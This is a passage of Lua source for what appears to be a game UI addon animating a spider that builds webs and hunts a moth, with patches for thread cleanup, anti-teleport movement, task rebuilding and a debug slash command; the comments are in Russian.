    if type(NSPauk) ~= "table" then
        return
    end

    if NSPauk.__nspKillUnfinishedDragPatch then
        return
    end
    NSPauk.__nspKillUnfinishedDragPatch = true

    ---------------------------------------------------------------------------
    -- Жёстко убивает владельца нити, если он остался без видимых текстур.
    -- Для основной нити убивает conn и все crossSegs, которые от неё зависят.
    -- Для cross/inter сегмента убивает сам сегмент и его inter-детей.
    ---------------------------------------------------------------------------
    function NSPauk:NP_KillOwnerHard(owner)
        if not owner then
            return
        end

        local inst = self:GetOwnerInstance(owner)

        local isSeg = owner.connA or owner.parentSegA or owner.isInterCross

        if isSeg then
            if owner.alive then
                self:KillSeg(owner)
            else
                if inst and inst.interSegs then
                    for _, inter in ipairs(inst.interSegs) do
                        if inter.alive and (inter.parentSegA == owner or inter.parentSegB == owner) then
                            self:KillSeg(inter)
                        end
                    end
                end
            end
        else
            if owner.alive and inst then
                self:KillConnection(inst, owner)
            elseif inst then
                for _, seg in ipairs(inst.crossSegs) do
                    if seg.alive and (seg.connA == owner or seg.connB == owner) then
                        self:KillSeg(seg)
                    end
                end

                self:CheckInstanceDead(inst)
            else
                owner.alive = false
            end
        end
    end

    ---------------------------------------------------------------------------
    -- Замена NP_ClearGlobalDrag.
    -- Если перетаскивание было очищено, а постоянная паутина так и не была
    -- создана, владелец нити больше не должен считаться живым.
    ---------------------------------------------------------------------------
    function NSPauk:NP_ClearGlobalDrag(fade)
        local S = self.S
        local drag = S.nspDrag

        if not drag then
            return
        end

        local owner = drag.owner
        local list = drag.textures or {}

        if fade and #list > 0 then
            self:AddFade(list, self.C.TEAR_FADE_DURATION or 1.5, nil)
        else
            self:RecycleTextures(list)
        end

        S.nspDrag = nil

        -- Если постоянных текстур так и не появилось, значит нить не была
        -- завершена. Убиваем её, чтобы перемычки не строились по пустоте.
        if owner and (not owner.textures or #owner.textures == 0) then
            self:NP_KillOwnerHard(owner)
        end
    end

    if type(NSPauk.BaseMethods) == "table" then
        NSPauk.BaseMethods.NP_KillOwnerHard = NSPauk.NP_KillOwnerHard
        NSPauk.BaseMethods.NP_ClearGlobalDrag = NSPauk.NP_ClearGlobalDrag
    end
end











































---------------------------------------------------------------------------
-- Anti-teleport helpers
---------------------------------------------------------------------------

function NSPauk:NP_GetAntiTeleportTolerance()
    return 4
end

function NSPauk:NP_GetSpiderPointIfShown()
    local S = self.S
    if S.spider and S.spider:IsShown() then
        return { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }
    end
    return nil
end

function NSPauk:NP_TaskAllowsImmediateStart(task)
    if not task then
        return false
    end

    -- Если мы явно разрешили мгновенный старт после нескольких попыток подхода.
    if task.nspAllowTeleport then
        return true
    end

    -- Восстановление состояния после мотылька может мгновенно поставить паука.
    if task.nspMothRestore then
        return true
    end

    return false
end

function NSPauk:NP_TaskNeedsFixedStart(task)
    if not task then
        return false
    end

    -- Этим задачам важно стартовать именно из их p0.
    -- Поэтому сначала пытаемся подойти к p0, а не телепортируемся.
    if task.nspStartDragTask then
        return true
    end

    if task.nspMothFreeze then
        return true
    end

    if task.kind == "thread" then
        return true
    end

    if task.nspTempThread then
        return true
    end

    return false
end

function NSPauk:NP_RecalcTaskStartFromCurrent(task)
    local cur = self:NP_GetSpiderPointIfShown()
    if not cur or not task then
        return
    end

    if not task.p0 or type(task.p0.x) ~= "number" or type(task.p0.y) ~= "number" then
        return
    end

    local dx = task.p0.x - cur.x
    local dy = task.p0.y - cur.y
    if dx * dx + dy * dy <= 1 then
        return
    end

    task.p0 = { x = cur.x, y = cur.y }

    if task.p2 and type(task.p2.x) == "number" and type(task.p2.y) == "number" then
        task.p1 = {
            x = (cur.x + task.p2.x) / 2,
            y = (cur.y + task.p2.y) / 2,
        }
    else
        task.p1 = { x = cur.x, y = cur.y }
    end

    -- Если это drag-задача, у которой запомнена финальная нить,
    -- тоже подтягиваем её начало к текущей точке, чтобы не было разрыва.
    if task.finalThread
        and task.finalThread.p2
        and type(task.finalThread.p2.x) == "number"
        and type(task.finalThread.p2.y) == "number" then
        task.finalThread.p0 = { x = cur.x, y = cur.y }
        task.finalThread.p1 = {
            x = (cur.x + task.finalThread.p2.x) / 2,
            y = (cur.y + task.finalThread.p2.y) / 2,
        }
    end

    task.pathLength = nil
    task.dropRemainder = nil
    task.nspRecalculatedFromCurrent = true
end

function NSPauk:NP_InsertApproachBeforeTask(task)
    local S = self.S
    local cur = self:NP_GetSpiderPointIfShown()

    if not cur or not task or not task.p0 then
        return false
    end

    if type(task.p0.x) ~= "number" or type(task.p0.y) ~= "number" then
        return false
    end

    local plan = self:NP_MakePlanTask(
        "travel",
        { x = cur.x, y = cur.y },
        { x = task.p0.x, y = task.p0.y },
        task.conn,
        task.owner
    )

    plan.nspApproachPlan = true

    table.insert(S.tasks, S.taskIdx, plan)

    task.nspApproachInserted = (task.nspApproachInserted or 0) + 1

    return true
end

---------------------------------------------------------------------------
-- AdvanceTask: anti-teleport version
---------------------------------------------------------------------------

function NSPauk:AdvanceTask()
    local S = self.S
    local old = S.currentTask
    local gap = self:NP_GetGap()

    local function makeContinueTask(task, fromPoint)
        local to = task.p2 and { x = task.p2.x, y = task.p2.y }
            or { x = fromPoint.x, y = fromPoint.y }

        local cont = self:NP_MakePlanTask("travel", fromPoint, to, task.conn, task.owner)
        cont.nspFallDepth = task.nspFallDepth or 0

        if task.nspDuringDrag and S.nspDrag then
            cont.nspDrag = true
            cont.nspContinueDrag = true
            cont.finalThread = S.nspDrag.finalThread
            cont.owner = S.nspDrag.owner or task.owner
            cont.nspDragEnd = task.nspDragEnd
        end

        return cont
    end

    if old
        and old.nspCrawl
        and not old.nspNoSupportCheck
        and not old.nspSupportLostHandled then
        local ownerAlive = not (old.owner and not old.owner.alive)
        local dragOwnerAlive = not (
            old.nspDuringDrag
            and S.nspDrag
            and S.nspDrag.owner
            and not S.nspDrag.owner.alive
        )

        if ownerAlive
            and dragOwnerAlive
            and not self:NP_NearSupportWithin(S.lastSpiderX, S.lastSpiderY, gap * 1.5) then
            old.nspSupportLostHandled = true

            local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }
            local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

            if old.nspDuringDrag then
                fall.nspDuringDrag = true
            end

            table.insert(S.tasks, S.taskIdx, fall)

            local cont = makeContinueTask(old, { x = fall.p2.x, y = fall.p2.y })
            table.insert(S.tasks, S.taskIdx + 1, cont)
        end
    end

    if old and old.nspDuringDrag and not old.nspSupportLostHandled then
        if old.nspDragEnd then
            if S.moveT and S.moveT >= 1 and self:IsTaskValid(old) then
                self:NP_FinishGlobalDrag(old)
            else
                self:NP_ClearGlobalDrag(true)
            end
        else
            if not self:IsTaskValid(old) then
                self:NP_ClearGlobalDrag(true)
            end
        end
    end

    if old and old.nspPlan then
        S.currentTask = nil
    end

    if S.limitReturnPending or S.phase == "limitWait" then
        if S.limitReturnPending then
            S.limitReturnPending = false
            S.phase = "limitWait"
            S.limitWaitTimer = 0
            S.completeTimer = 0
        end
        return
    end

    while S.taskIdx <= #S.tasks do
        local task = S.tasks[S.taskIdx]

        if self:IsTaskValid(task) then
            local x = S.lastSpiderX or 0
            local y = S.lastSpiderY or 0

            local supported = self:NP_FreshHasSupportAt(x, y)
                or self:NP_NearSupportWithin(x, y, gap * 1.5)

            if S.spider
                and S.spider:IsShown()
                and not task.nspPlan
                and not task.nspFall
                and not task.nspNoSupportCheck
                and not task.nspPreFallInserted
                and not supported then
                task.nspPreFallInserted = true

                local from = { x = x, y = y }
                local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))
                table.insert(S.tasks, S.taskIdx, fall)
            elseif task.nspPlan then
                S.taskIdx = S.taskIdx + 1
                self:NP_ExecutePlan(task)

                if S.limitReturnPending or S.phase == "limitWait" then
                    return
                end
            else
                local skipStart = false

                -------------------------------------------------------
                -- Anti-teleport:
                -- если задача началась далеко от текущей позиции,
                -- либо пересчитываем её от текущей точки,
                -- либо сначала вставляем подход к её p0.
                -------------------------------------------------------
                if not self:NP_TaskAllowsImmediateStart(task) then
                    local cur = self:NP_GetSpiderPointIfShown()

                    if cur
                        and task.p0
                        and type(task.p0.x) == "number"
                        and type(task.p0.y) == "number" then
                        local tol = self:NP_GetAntiTeleportTolerance()
                        local dx = task.p0.x - cur.x
                        local dy = task.p0.y - cur.y

                        if dx * dx + dy * dy > tol * tol then
                            if self:NP_TaskNeedsFixedStart(task) then
                                if (task.nspApproachInserted or 0) < 3 then
                                    if self:NP_InsertApproachBeforeTask(task) then
                                        skipStart = true
                                    else
                                        self:NP_RecalcTaskStartFromCurrent(task)
                                    end
                                else
                                    -- Если несколько подходов не помогли,
                                    -- всё равно не телепортируем, а стартуем
                                    -- задачу от текущей точки.
                                    self:NP_RecalcTaskStartFromCurrent(task)
                                    task.nspApproachFailed = true
                                end
                            else
                                self:NP_RecalcTaskStartFromCurrent(task)
                            end
                        end
                    end
                end

                if skipStart then
                    S.currentTask = nil
                else
                    S.currentTask = task
                    S.taskIdx = S.taskIdx + 1
                    self:StartTask(task)
                    return
                end
            end
        else
            local ownerAlive = not (task.owner and not task.owner.alive)
            local dragOwnerAlive = not (
                task.nspDuringDrag
                and S.nspDrag
                and S.nspDrag.owner
                and not S.nspDrag.owner.alive
            )

            if task
                and task.nspCrawl
                and not task.nspNoSupportCheck
                and not task.nspSupportLostConsumed
                and ownerAlive
                and dragOwnerAlive
                and not self:NP_NearSupportWithin(S.lastSpiderX, S.lastSpiderY, gap * 1.5) then
                task.nspSupportLostConsumed = true

                local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }
                local fall = self:NP_MakeFallTask(from, self:NP_FindFallTarget(from.x, from.y))

                if task.nspDuringDrag then
                    fall.nspDuringDrag = true
                end

                table.insert(S.tasks, S.taskIdx, fall)

                local cont = makeContinueTask(task, { x = fall.p2.x, y = fall.p2.y })
                table.insert(S.tasks, S.taskIdx + 1, cont)
            else
                if task
                    and task.nspDuringDrag
                    and not task.nspTempThread
                    and not task.nspSupportLostConsumed then
                    self:NP_ClearGlobalDrag(true)
                end

                S.taskIdx = S.taskIdx + 1
            end
        end
    end

    if S.limitReturnPending then
        S.limitReturnPending = false
        S.phase = "limitWait"
        S.limitWaitTimer = 0
        S.completeTimer = 0
        return
    end

    S.phase = "instanceComplete"
    S.completeTimer = 0
end

---------------------------------------------------------------------------
-- StartTask: anti-teleport version
---------------------------------------------------------------------------

function NSPauk:StartTask(task)
    local S = self.S
    local C = self.C

    if task.nspPlan then
        S.currentTask = nil
        self:NP_ExecutePlan(task)
        S.phase = "task"
        S.moveDur = 0.05
        S.moveT = 0
        return
    end

    if task.nspMothRestore then
        self:PutSpider(task.p0.x, task.p0.y)
        self:RestoreMothStateImmediate(task.nspSaved)
        return
    end

    if task.nspMothFreeze then
        if not self:NP_TaskAllowsImmediateStart(task) then
            self:NP_RecalcTaskStartFromCurrent(task)
        end

        if self.GetMothStuckInfo and not self:GetMothStuckInfo() then
            self:AbortMothHunt(false, false, true)
            return
        end

        if self.CallMoth then
            self:CallMoth("Freeze")
        end

        if S.moth and S.moth.active then
            S.moth.frozen = true
            S.moth.phase = "wrap"
        end

        S.currentTask = task
        task.drop = false
        S.moveDur = 0.2
        S.moveT = 0
        S.lastTaskT = 0
        S.speedTimer = 0
        S.phase = "task"

        self:PutSpider(task.p0.x, task.p0.y)
        return
    end

    S.currentTask = task

    if task.kind ~= "thread" then
        task.drop = false
    end

    -----------------------------------------------------------------------
    -- Важно: запоминаем текущую позицию ДО PutSpider.
    -- Раньше StartTask сначала телепортировал паука в task.p0,
    -- а потом пытался проверить "далеко ли от текущей позиции",
    -- и всегда получал нулевое расстояние.
    -----------------------------------------------------------------------
    local cur = self:NP_GetSpiderPointIfShown()

    if cur
        and not self:NP_TaskAllowsImmediateStart(task)
        and task.p0
        and type(task.p0.x) == "number"
        and type(task.p0.y) == "number" then
        local tol = self:NP_GetAntiTeleportTolerance()
        local dx = task.p0.x - cur.x
        local dy = task.p0.y - cur.y

        if dx * dx + dy * dy > tol * tol then
            self:NP_RecalcTaskStartFromCurrent(task)
        end
    end

    if task.nspFall then
        if cur and task.p2 and type(task.p2.y) == "number" then
            task.p0 = { x = cur.x, y = cur.y }

            if task.p2.y > task.p0.y - 1 then
                task.p2 = { x = task.p0.x, y = math.max(0, task.p0.y - 1) }
            else
                task.p2 = { x = task.p0.x, y = task.p2.y }
            end

            task.p1 = { x = task.p0.x, y = (task.p0.y + task.p2.y) / 2 }
        end

        task.pathLength = nil
    end

    if task.nspCrawl or task.nspTempThread then
        if cur
            and task.p2
            and type(task.p2.x) == "number"
            and type(task.p2.y) == "number" then
            local dx = task.p0.x - cur.x
            local dy = task.p0.y - cur.y

            if dx * dx + dy * dy > 1 then
                task.p0 = { x = cur.x, y = cur.y }
                task.p1 = {
                    x = (cur.x + task.p2.x) / 2,
                    y = (cur.y + task.p2.y) / 2,
                }
                task.pathLength = nil
            end
        end

        if task.nspTempThread and task.p2 and type(task.p2.y) == "number" then
            task.p1 = { x = task.p0.x, y = (task.p0.y + task.p2.y) / 2 }
            task.p2 = { x = task.p0.x, y = task.p2.y }
            task.pathLength = nil
        end
    end

    local pathLen = self:ApproxThreadLength(task)
    task.pathLength = pathLen

    local len = pathLen
    if len < 1 then
        len = 1
    end

    local speed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX)

    if task.kind == "travel" then
        speed = speed * C.TRAVEL_SPEED_MULT
    end

    if task.isCross then
        speed = speed * C.CROSS_SPEED_MULT
    end

    if task.isMain then
        speed = speed * C.MAIN_SPEED_MULT
    end

    if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
        speed = speed * C.FAST_MODE
    end

    if speed <= 0 then
        speed = 1
    end

    S.moveDur = len / speed
    if S.moveDur < 0.05 then
        S.moveDur = 0.05
    end

    S.moveT = 0
    S.lastTaskT = 0
    S.speedTimer = 0
    S.phase = "task"

    S.lastDropX = task.p0.x
    S.lastDropY = task.p0.y

    self:PutSpider(task.p0.x, task.p0.y)

    if task.drop then
        task.dropSpacing = self:GetWebPointSpacing()
        task.dropRemainder = 0
        self:DropWebForTask(task, task.p0.x, task.p0.y)
    else
        task.dropSpacing = nil
        task.dropRemainder = nil
    end

    if task.nspStartDragTask then
        self:NP_StartDrag(task)
    end

    if task.nspFall then
        local fallLen = self:ApproxThreadLength(task)
        task.pathLength = fallLen

        if fallLen < 1 then
            fallLen = 1
        end

        local fallMult = math.max(3, (tonumber(C.TRAVEL_SPEED_MULT) or 6) * 0.8)
        local fallSpeed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX) * fallMult

        if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
            fallSpeed = fallSpeed * C.FAST_MODE
        end

        if fallSpeed <= 0 then
            fallSpeed = 1
        end

        S.moveDur = fallLen / fallSpeed
        if S.moveDur < 0.05 then
            S.moveDur = 0.05
        end

        S.moveT = 0
        S.lastTaskT = 0

        self:PutSpider(task.p0.x, task.p0.y)
    end

    if task.nspCrawl or task.nspTempThread then
        local crawlLen = self:ApproxThreadLength(task)
        task.pathLength = crawlLen

        if crawlLen < 1 then
            crawlLen = 1
        end

        local crawlSpeed = self:RandomInt(C.SPIDER_SPEED_MIN, C.SPIDER_SPEED_MAX)

        if not task.nspTempThread then
            if task.isCross then
                crawlSpeed = crawlSpeed * (C.CROSS_SPEED_MULT or 1)
            end

            if task.isMain then
                crawlSpeed = crawlSpeed * (C.MAIN_SPEED_MULT or 1)
            end
        end

        if type(C.FAST_MODE) == "number" and C.FAST_MODE > 0 then
            crawlSpeed = crawlSpeed * C.FAST_MODE
        end

        if crawlSpeed <= 0 then
            crawlSpeed = 1
        end

        S.moveDur = crawlLen / crawlSpeed
        if S.moveDur < 0.05 then
            S.moveDur = 0.05
        end

        S.moveT = 0
        S.lastTaskT = 0

        self:PutSpider(task.p0.x, task.p0.y)
    end
end

---------------------------------------------------------------------------
-- Если вставляешь патч в конец файла, обнови BaseMethods,
-- чтобы режимы не вернули старые версии функций.
---------------------------------------------------------------------------

if type(NSPauk.BaseMethods) == "table" then
    NSPauk.BaseMethods.NP_GetAntiTeleportTolerance = NSPauk.NP_GetAntiTeleportTolerance
    NSPauk.BaseMethods.NP_GetSpiderPointIfShown = NSPauk.NP_GetSpiderPointIfShown
    NSPauk.BaseMethods.NP_TaskAllowsImmediateStart = NSPauk.NP_TaskAllowsImmediateStart
    NSPauk.BaseMethods.NP_TaskNeedsFixedStart = NSPauk.NP_TaskNeedsFixedStart
    NSPauk.BaseMethods.NP_RecalcTaskStartFromCurrent = NSPauk.NP_RecalcTaskStartFromCurrent
    NSPauk.BaseMethods.NP_InsertApproachBeforeTask = NSPauk.NP_InsertApproachBeforeTask
    NSPauk.BaseMethods.AdvanceTask = NSPauk.AdvanceTask
    NSPauk.BaseMethods.StartTask = NSPauk.StartTask
end

























---------------------------------------------------------------------------
-- Учёт потерянных нитей после охоты на мотылька
---------------------------------------------------------------------------

function NSPauk:NP_IsTaskLost(task)
    local S = self.S

    if not task then
        return true
    end

    -- Служебные задачи возврата не считаем потерянными.
    if task.nspMothRestore then
        return false
    end

    if task.nspMothReturnPlan then
        return false
    end

    -- Падение может быть частью восстановления маршрута.
    if task.nspFall then
        return false
    end

    -- Задача, которая сама начинает drag, может выполняться до того,
    -- как S.nspDrag создан. Поэтому не считаем её потерянной только
    -- из-за отсутствия S.nspDrag.
    if task.nspDuringDrag and not task.nspStartDragTask then
        if not S.nspDrag or not S.nspDrag.owner or not S.nspDrag.owner.alive then
            return true
        end
    end

    local owner = task.owner

    -- Владелец задачи мёртв.
    if owner and not owner.alive then
        return true
    end

    -- Прямая ссылка на conn, который мёртв.
    if task.conn and not task.conn.alive then
        return true
    end

    -- Зависимости владельца.
    if owner then
        if owner.connA and not owner.connA.alive then
            return true
        end

        if owner.connB and not owner.connB.alive then
            return true
        end

        if owner.parentSegA and not owner.parentSegA.alive then
            return true
        end

        if owner.parentSegB and not owner.parentSegB.alive then
            return true
        end
    end

    -- Если instance, к которому относится задача, уже порван.
    local inst = self:GetOwnerInstance(owner)
    if not inst and task.conn then
        inst = self:GetOwnerInstance(task.conn)
    end

    if inst and inst.torn then
        return true
    end

    -- Для thread-задач владелец обязателен.
    if task.kind == "thread" then
        if not owner then
            return true
        end

        local ref = owner.thread and owner.thread.ownerRef
        local threadInst = ref and ref.inst

        if not threadInst then
            return true
        end
    end

    return false
end

function NSPauk:NP_PurgeLostTasks()
    local S = self.S

    if type(S.tasks) ~= "table" or #S.tasks == 0 then
        return
    end

    local startIdx = S.taskIdx or 1
    if startIdx < 1 then
        startIdx = 1
    end

    local newTasks = {}

    for i = startIdx, #S.tasks do
        local task = S.tasks[i]

        if task and not self:NP_IsTaskLost(task) then
            newTasks[#newTasks + 1] = task
        end
    end

    S.tasks = newTasks
    S.taskIdx = 1
    S.currentTask = nil
end


function NSPauk:RestoreMothStateImmediate(saved)
    local S = self.S

    if not saved then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
        return
    end

    S.phase = saved.phase or "watch"
    S.currentInstance = saved.currentInstance
    S.tasks = saved.tasks or {}
    S.taskIdx = saved.taskIdx or 1
    S.currentTask = nil
    S.cocoon = saved.cocoon
    S.completeTimer = saved.completeTimer or 0
    S.moveDur = saved.moveDur or 1
    S.moveT = 0
    S.lastTaskT = 0
    S.speedTimer = 0
    S.stillTimer = saved.stillTimer or 0
    S.limitReached = saved.limitReached
    S.limitReturnPending = saved.limitReturnPending
    S.limitCocoonPending = saved.limitCocoonPending
    S.limitWaitTimer = saved.limitWaitTimer or 0
    S.limitHomePoint = saved.limitHomePoint

    -- После возврата из охоты явно вычищаем задачи, которые ссылаются
    -- на убитую/потерянную нить.
    if S.phase == "task" or S.phase == "instanceComplete" then
        self:NP_PurgeLostTasks()
    end

    if S.phase == "dissolve" and not S.cocoon then
        S.phase = "watch"
    end
end


if type(NSPauk.BaseMethods) == "table" then
    NSPauk.BaseMethods.NP_IsTaskLost = NSPauk.NP_IsTaskLost
    NSPauk.BaseMethods.NP_PurgeLostTasks = NSPauk.NP_PurgeLostTasks
    NSPauk.BaseMethods.RestoreMothStateImmediate = NSPauk.RestoreMothStateImmediate
end










---------------------------------------------------------------------------
-- Диагностика секторов перемычек
-- Команда:
--   /nspsectors
--   /nspsectors angle 200
---------------------------------------------------------------------------

function NSPauk:NP_DebugSectors()
    local S = self.S
    local C = self.C
    local inst = S.currentInstance

    if not inst then
        self:Print("Нет текущей паутины: S.currentInstance = nil")
        return
    end

    local N = inst.conns and #inst.conns or 0

    self:Print(string.format(
        "Instance id=%s, isCocoon=%s, conns=%d, crossRows=%s, torn=%s",
        tostring(inst.id),
        tostring(inst.isCocoon),
        N,
        tostring(inst.crossRows),
        tostring(inst.torn)
    ))

    if N == 0 then
        self:Print("В текущей паутине нет нитей.")
        return
    end

    local maxSectorAngle = tonumber(C.CROSS_MAX_SECTOR_ANGLE) or 160
    local crossSpacing = tonumber(C.CROSS_ROW_SPACING) or 0
    local minCrossLen = tonumber(C.MIN_CROSS_LEN) or 0

    self:Print(string.format(
        "CROSS_MAX_SECTOR_ANGLE=%.1f, CROSS_ROW_SPACING=%.1f, MIN_CROSS_LEN=%.1f",
        maxSectorAngle,
        crossSpacing,
        minCrossLen
    ))

    for i, conn in ipairs(inst.conns) do
        local angleRad = conn.thread and conn.thread.angle or 0
        local angleDeg = angleRad * 180 / math.pi
        local arcLength = conn.arcLength or 0
        local texCount = conn.textures and #conn.textures or 0
        local targetName = conn.target and conn.target.name or "?"

        self:Print(string.format(
            "conn %d: angle=%.1f, arcLength=%.1f, alive=%s, textures=%d, target=%s",
            i,
            angleDeg,
            arcLength,
            tostring(conn.alive),
            texCount,
            tostring(targetName)
        ))
    end

    local sectorAllowed, sectorAngleDeg = self:ComputeCrossSectors(inst)

    local sumAngles = 0

    for i = 1, N do
        local j = (i % N) + 1

        local deg = sectorAngleDeg and sectorAngleDeg[i] or 0
        local allowed = sectorAllowed and sectorAllowed[i]

        local lenA = inst.conns[i].arcLength or 0
        local lenB = inst.conns[j].arcLength or 0
        local pairMin = math.min(lenA, lenB)

        sumAngles = sumAngles + deg

        self:Print(string.format(
            "sector %d-%d: angle=%.1f, allowed=%s, pairMin=%.1f",
            i,
            j,
            deg,
            tostring(allowed),
            pairMin
        ))
    end

    self:Print(string.format("Сумма углов секторов: %.1f", sumAngles))

    if type(inst.crossRowsList) == "table" then
        local rows = #inst.crossRowsList
        local totalRowSegs = 0
        local aliveRowSegs = 0

        local sectorTotal = {}
        local sectorAlive = {}

        for _, row in ipairs(inst.crossRowsList) do
            if type(row) == "table" then
                for idx, seg in pairs(row) do
                    if type(idx) == "number" and type(seg) == "table" then
                        totalRowSegs = totalRowSegs + 1

                        if seg.alive then
                            aliveRowSegs = aliveRowSegs + 1
                            sectorAlive[idx] = (sectorAlive[idx] or 0) + 1
                        end

                        sectorTotal[idx] = (sectorTotal[idx] or 0) + 1
                    end
                end
            end
        end

        self:Print(string.format(
            "crossRowsList: rows=%d, rowSegs total=%d, alive=%d",
            rows,
            totalRowSegs,
            aliveRowSegs
        ))

        for i = 1, N do
            self:Print(string.format(
                "sector %d rowSegs: total=%d, alive=%d",
                i,
                sectorTotal[i] or 0,
                sectorAlive[i] or 0
            ))
        end
    else
        self:Print("crossRowsList: нет")
    end

    if type(inst.crossSegs) == "table" then
        local total = #inst.crossSegs
        local alive = 0
        local inter = 0

        for _, seg in ipairs(inst.crossSegs) do
            if seg.alive then
                alive = alive + 1
            end

            if seg.isInterCross then
                inter = inter + 1
            end
        end

        self:Print(string.format(
            "crossSegs: total=%d, alive=%d, interCross=%d",
            total,
            alive,
            inter
        ))
    else
        self:Print("crossSegs: нет")
    end
end

do
    if type(SlashCmdList) == "table" then
        local cmdName = "NSPAUKSECTORS"

        if not SlashCmdList[cmdName] then
            SlashCmdList[cmdName] = function(msg)
                msg = type(msg) == "string" and msg or ""
                msg = msg:gsub("^%s+", "")
                msg = msg:gsub("%s+$", "")

                local cmd, arg = msg:match("^(%S+)%s+(%S+)$")

                if cmd == "angle" and tonumber(arg) then
                    local value = tonumber(arg)

                    if value < 0 then
                        value = 0
                    end

                    if value > 360 then
                        value = 360
                    end

                    NSPauk.C.CROSS_MAX_SECTOR_ANGLE = value

                    if type(NSPauk.DB) == "table"
                        and type(NSPauk.DB.constants) == "table" then
                        NSPauk.DB.constants.CROSS_MAX_SECTOR_ANGLE = value
                    end

                    NSPauk:Print(string.format(
                        "CROSS_MAX_SECTOR_ANGLE=%.1f. Для применения создай новую паутину.",
                        value
                    ))
                elseif cmd == "angle" then
                    NSPauk:Print("Использование: /nspsectors angle 160")
                else
                    NSPauk:NP_DebugSectors()
                end
            end

            if _G then
                _G["SLASH_" .. cmdName .. "1"] = "/nspsectors"
                _G["SLASH_" .. cmdName .. "2"] = "/pauksectors"
            end
        end
    end
end
















---------------------------------------------------------------------------
-- Пересборка задач паутины после возврата из охоты на мотылька.
--
-- Важно:
-- - не создаёт новые conn / crossSeg;
-- - использует уже существующие владельцы;
-- - пропускает уже нарисованные нити;
-- - дорисовывает живые, но ещё не нарисованные нити;
-- - убивает владельцев, чьи родители мертвы или не будут нарисованы.
---------------------------------------------------------------------------

function NSPauk:NP_RebuildInstanceTasks(inst)
    local S = self.S

    if not inst or inst.torn then
        return nil
    end

    local tasks = {}
    local added = {}

    local cursor = nil
    if S.spider and S.spider:IsShown() then
        cursor = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }
    end

    local function isDrawn(owner)
        return owner
            and owner.alive
            and owner.textures
            and #owner.textures > 0
    end

    local function isScheduled(owner)
        return owner and added[owner] == true
    end

    local function isAvailable(owner)
        if not owner or not owner.alive then
            return false
        end

        if isDrawn(owner) then
            return true
        end

        if isScheduled(owner) then
            return true
        end

        return false
    end

    local function killOwner(owner)
        if not owner or not owner.alive then
            return
        end

        if self.NP_KillOwnerHard then
            self:NP_KillOwnerHard(owner)
        else
            owner.alive = false
        end
    end

    local function addOwner(owner, thread, isMain)
        if not owner or not owner.alive then
            return false
        end

        if added[owner] then
            return false
        end

        -- Уже нарисованные нити не трогаем.
        if isDrawn(owner) then
            return false
        end

        if not thread or not thread.p0 or not thread.p2 then
            killOwner(owner)
            return false
        end

        -- Основная нить должна иметь живой валидный anchor.
        if owner.target then
            if not self:ValidateConnection(inst, owner) then
                return false
            end
        end

        -- Перемычка может быть нарисована только если обе основные нити
        -- либо уже нарисованы, либо запланированы к рисованию.
        if owner.connA or owner.connB then
            if not isAvailable(owner.connA) or not isAvailable(owner.connB) then
                killOwner(owner)
                return false
            end
        end

        -- Inter-cross может быть нарисован только если родительские
        -- перемычки живы и либо нарисованы, либо запланированы.
        if owner.parentSegA and not isAvailable(owner.parentSegA) then
            killOwner(owner)
            return false
        end

        if owner.parentSegB and not isAvailable(owner.parentSegB) then
            killOwner(owner)
            return false
        end

        if cursor then
            self:AddTravelPointTask(
                tasks,
                cursor,
                { x = thread.p0.x, y = thread.p0.y },
                owner.connA or owner,
                owner
            )
        end

        local task = self:AddThreadTask(tasks, owner, thread)
        if not task then
            return false
        end

        if isMain then
            task.isMain = true
        end

        added[owner] = true
        cursor = { x = thread.p2.x, y = thread.p2.y }

        return true
    end

    -----------------------------------------------------------------------
    -- 1. Сначала дорисовываем живые, но ещё не нарисованные основные нити.
    -----------------------------------------------------------------------
    for _, conn in ipairs(inst.conns or {}) do
        if conn.alive and not isDrawn(conn) then
            local drawThread = self:MakeTopDownDrawThread(conn.thread, cursor)
            if drawThread then
                addOwner(conn, drawThread, true)
            else
                killOwner(conn)
            end
        end
    end

    -----------------------------------------------------------------------
    -- 2. Потом дорисовываем перемычки по существующим рядам.
    -----------------------------------------------------------------------
    local N = inst.conns and #inst.conns or 0

    if inst.crossRowsList then
        for _, row in ipairs(inst.crossRowsList) do
            if type(row) == "table" then
                for idx = 1, N do
                    local seg = row[idx]
                    if seg then
                        addOwner(seg, seg.thread, false)
                    end
                end
            end
        end
    end

    -----------------------------------------------------------------------
    -- 3. Если вдруг есть обычные crossSeg вне crossRowsList, пробуем их.
    -----------------------------------------------------------------------
    if inst.crossSegs then
        for _, seg in ipairs(inst.crossSegs) do
            if not seg.isInterCross then
                addOwner(seg, seg.thread, false)
            end
        end
    end

    -----------------------------------------------------------------------
    -- 4. Затем inter-cross.
    -----------------------------------------------------------------------
    if inst.interSegs then
        for _, seg in ipairs(inst.interSegs) do
            addOwner(seg, seg.thread, false)
        end
    end

    self:CheckInstanceDead(inst)

    if inst.torn then
        return {}
    end

    inst.tasks = tasks
    return tasks
end

---------------------------------------------------------------------------
-- Обновлённая RestoreMothStateImmediate.
--
-- После восстановления состояния, если это обычная паутина,
-- пересобираем список задач по фактическому состоянию instance.
---------------------------------------------------------------------------

function NSPauk:RestoreMothStateImmediate(saved)
    local S = self.S

    if not saved then
        S.phase = "watch"
        S.stillTimer = 0
        S.speedTimer = 0
        return
    end

    S.phase = saved.phase or "watch"
    S.currentInstance = saved.currentInstance
    S.tasks = saved.tasks or {}
    S.taskIdx = saved.taskIdx or 1
    S.currentTask = nil
    S.cocoon = saved.cocoon
    S.completeTimer = saved.completeTimer or 0
    S.moveDur = saved.moveDur or 1
    S.moveT = 0
    S.lastTaskT = 0
    S.speedTimer = 0
    S.stillTimer = saved.stillTimer or 0
    S.limitReached = saved.limitReached
    S.limitReturnPending = saved.limitReturnPending
    S.limitCocoonPending = saved.limitCocoonPending
    S.limitWaitTimer = saved.limitWaitTimer or 0
    S.limitHomePoint = saved.limitHomePoint

    -----------------------------------------------------------------------
